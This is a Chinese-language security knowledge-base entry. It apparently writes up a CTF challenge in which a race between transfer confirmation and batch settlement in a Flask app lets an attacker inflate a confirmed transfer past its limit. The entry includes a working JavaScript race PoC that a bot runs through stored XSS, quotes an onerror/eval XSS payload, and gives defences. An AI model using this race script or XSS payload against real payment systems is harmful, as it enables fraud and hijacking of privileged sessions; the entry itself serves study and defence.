---
id: web-generic-race-condition-transaction-status-toctou-limit-bypass
title: 转账结算 TOCTOU 竞争：confirm 与结算间隙篡改 status/amount 绕过单笔限额放大转账
type: scenario
domain: web
path: web/generic/race-condition
technique: transaction-status-toctou-limit-bypass
tags:
- race-condition
- toctou
- transaction
- business-logic
- xss
- bot
- flask
- sqlalchemy
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-22
  verified_at: '2026-11-08T13:27:19+08:00'
  notes: 已对照原文核对：confirm(0.1s)/send(0.13s) 双任务窗口、amount<=10 校验、confirmed→结算间隙改 amount/status 的竞态原理与 XSS 驱动 PoC 均与原文一致，转账列表 999999989 LP 已 sent 截图佐证；组件版本不适用故不设 affected_versions；最终 flag 获取未在原文完整展示为未验证点
url: /docs/web/generic/race-condition/web-generic-race-condition-transaction-status-toctou-limit-bypass/
draft: false
kb_aliases:
- Hackchan
- 转账状态竞争
- confirm 结算间隙
- amount 篡改放大
- bot XSS 驱动竞争
---

## 一句话结论

结算任务只挑 `status == 'confirmed'` 的交易，且结算时才校验 `sender.balance >= amount` 并扣款；而在"确认后、结算前"的窗口内创建/修改请求仍能改写同一笔交易的 `amount`（或把 status 抢改为 confirmed），配合并发时序即可让一笔远超单笔限额（如 10 元）的巨额转账通过结算——本质是状态机两阶段提交之间的 TOCTOU，叠加 bot 场景下先用存储型 XSS 驱动管理员会话自动化发起竞争请求。

## 原理

- **两阶段状态机存在中间态**：交易生命周期为 `created → confirmed → sent/rejected`。页面处理（同步请求）负责把交易置为 confirmed；后台 `send_transaction()` 定期批量结算：
  - 读取全部 `status=='confirmed'` 的交易；
  - 对每笔检查 `sender.balance >= transaction.amount`，通过则置 `sent`、扣发送方、加接收方，否则 `rejected`。
  中间态 confirmed 与终态 sent 之间的时间窗就是竞争窗口。
- **窗口内的写操作未被隔离**：确认与结算分别走不同请求/线程，SQLAlchemy 会话之间没有行锁或版本控制；同一交易 id 在窗口内再次提交带 `transaction_id` 与新 `amount` 的表单时，应用按"用户自己的未结算交易可编辑"处理，直接更新行数据，后台任务随后读到的是已被放大的 amount。
- **限额校验位置错误**：单笔限额（amount ≤ 10）只在创建/编辑入口做表面限制或根本未覆盖"已创建交易的编辑"路径，而真正放钱的结算路径只做余额下限校验，不做限额复核——校验点与生效点分离是此类漏洞的通病。
- **bot 场景放大利用**：站点由 headless bot 定期访问 `http://web:8000/` 前缀 URL。攻击页内嵌脚本以管理员身份 fetch `create-transaction`（`credentials: 'include'`），先创建最小交易并从响应 DOM 解析最大 transaction id，再 setTimeout 20ms 后以 `transaction_id + amount=999999989` 重提交——恰好卡进 confirm 与后台结算之间。XSS 载荷经 FAQ 的 TF-IDF 标签匹配渲染出误留的 `.swap` vim 交换文件模板注入（`action=faq&question=...<img src=x onerror=eval(atob(...))>`），确保脚本在 bot 的已登录上下文执行。
- **为什么余额下限校验拦不住**：管理员初始余额不足时，攻击脚本可先发多笔 1 元交易确认后由结算正常放款，或直接选 amount 使首包通过校验；竞争成功一次即可把余额推到 flag 门槛（≥999,999,999），且 `is_manager` 校验只挡管理员本人，普通 bot 账户即可兑换 flag。

## 触发条件

- 交易/订单存在 confirmed 之类的中间状态，且结算由异步任务批量处理（存在可预测的时间窗）。
- 中间态记录可被原所有者再次编辑（amount/recipient/status），或确认接口可对任意 id 重放并发调用。
- 结算端不复核业务限额，仅校验余额；数据库层无乐观锁/行锁/唯一约束兜底。
- bot 型场景：存在以特权身份访问攻击者可控 URL 的自动化浏览器（XSS 注入点 + `credentials: include`）。

## 利用步骤

1. 找到转账创建接口与交易列表页，确认存在 `transaction_id`、`status` 字段且 confirmed 交易仍可编辑。
2. 注入 XSS（本题经 FAQ 标签匹配渲染残留 `.swp` 模板）使 bot 执行脚本。
3. 脚本：创建 1 元交易 → 从响应 DOM 解析出本次 `transaction_id`（取最大 id +1 或直接抓行首数字）→ 立即对同一 id 以 `amount=999999989` 重提交（间隔 ~20ms）。
4. 后台结算任务读取到 confirmed 状态 + 已放大 amount，余额校验通过即放款。
5. 余额达标后访问兑换路由获得 flag。

## PoC

竞争核心请求序列（在 bot 的 XSS 上下文中执行，credentials include）：

```javascript
// 1) 创建最小交易，解析 transaction_id
fetch('/?action=create-transaction', {method:'POST', credentials:'include',
  headers:{'content-type':'application/x-www-form-urlencoded'},
  body:'recipient=me&amount=1'})
.then(r => r.text()).then(html => {
  const ids = [...new DOMParser().parseFromString(html,'text/html')
    .querySelectorAll('table>tbody>tr>td:first-child')].map(td => parseInt(td.innerText,10));
  const tid = String(1 + Math.max(...ids));
  // 2) 在 confirm 后、后台结算前，对同一 id 放大 amount
  setTimeout(() => fetch('/?action=create-transaction', {method:'POST', credentials:'include',
    headers:{'content-type':'application/x-www-form-urlencoded'},
    body:'recipient=me&amount=999999989&transaction_id=' + tid}), 20);
});
```

服务端竞争点（结算任务读取与入口写并行）：

```python
# 后台结算：只看 status 与余额，不复核限额
confirmed = Transaction.query.filter(Transaction.status == 'confirmed').all()
for t in confirmed:
    if sender.balance >= t.amount:      # TOCTOU：此刻 amount 已被窗口内请求改写
        t.status = 'sent'; sender.balance -= t.amount; recipient.balance += t.amount
```

## 变体与关联

- 变体：不篡改 amount，而是并发对同一交易发起多次 confirm，让结算任务把同一 confirmed 记录处理两次（缺唯一约束时的双花）。
- 变体：优惠券/返现场景同构——下单后、审核前修改订单金额使返利按放大值计算，见 `[[web-generic-race-condition-coupon-order-submit-reuse]]`、`[[web-generic-race-condition-tip-reputation-role-escalation]]`。
- 变体：无编辑接口时，用两个并发请求分别命中"确认"与"结算前最后一次读取"（HTTP 并发 + 数据库隔离级别弱）。
- 关联：`[[web-generic-race-condition-pickle-audit-save-before-check-toctou]]`（save-before-check 同型 TOCTOU）、`[[web-generic-race-condition-register-verified-login-window]]`（状态窗口期滥用）。
- 边界：结算任务与 Web 请求若共用同一会话/加行锁（`with_for_update`）、或编辑接口对 confirmed 记录拒绝写入，则窗口关闭；bot 访问间隔、结算轮询周期决定竞争成功率，需要多次尝试。

## 检测与防御

- **状态机收敛**：confirmed 后禁止任何字段编辑（服务端白名单只放行 status 单向流转）；确认与结算对同一行加 `SELECT ... FOR UPDATE` 或乐观锁版本号。
- **限额复核前置**：把单笔/日累计限额校验放在结算端（资金实际变动处），而不是只在入口表单校验。
- **原子性**：余额变更用数据库原子操作（`UPDATE ... SET balance=balance-? WHERE balance>=?`）并检查受影响行数，防双花。
- **检测**：审计日志对同一 transaction_id 的高频/字段突变写入告警；监控 confirmed→sent 窗口内的 UPDATE 语句；bot XSS 注入点（残留 .swp/备份文件、模板目录遍历）纳入文件基线巡检。
- **入口加固**：清理开发残留文件（.swp、.bak）；FAQ 标签到模板路径的匹配应做白名单校验，避免把任意目录文件渲染为模板。
